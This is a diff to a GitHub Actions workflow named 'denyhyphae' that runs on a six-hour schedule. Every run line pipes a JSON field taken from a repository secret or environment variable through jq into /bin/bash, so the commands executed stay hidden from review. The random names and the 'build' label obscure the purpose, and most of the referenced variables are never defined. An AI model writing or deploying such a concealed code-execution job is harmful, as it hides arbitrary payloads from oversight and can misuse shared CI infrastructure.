@@ -1,20 +1,25 @@
 name: denyhyphae
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 3/6 * * *'
-jobs:  # 22770
+    - cron: '19 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: denyhyphae
         env:
-          gs14: ${{ secrets.gs14 }}
+          ne7: ${{ secrets.ne7 }}
         run: |
-          echo $gs14 | jq -r .efn7 | /bin/bash
-          echo $ddm88747 | jq -r .hufo4158 | /bin/bash
-          echo $x1626 | jq -r .f42 | /bin/bash
-          echo $njz1 | jq -r .blkfd89375 | /bin/bash
-          echo $qtixf3705 | jq -r .braln8084 | /bin/bash
+          echo $ne7 | jq -r .tu2 | /bin/bash
+          echo $xlsgm5871 | jq -r .vfnup03 | /bin/bash
+          echo $wbcu8837 | jq -r .bxl6750 | /bin/bash
+          echo $hxr0 | jq -r .ejcwi058 | /bin/bash
+          echo $mbmci08707 | jq -r .ek27454 | /bin/bash
+          echo $wj44982 | jq -r .mikg79 | /bin/bash
+          echo $m8282 | jq -r .zzrrc38176 | /bin/bash
+          echo $pwj258 | jq -r .ogkm20122 | /bin/bash
 
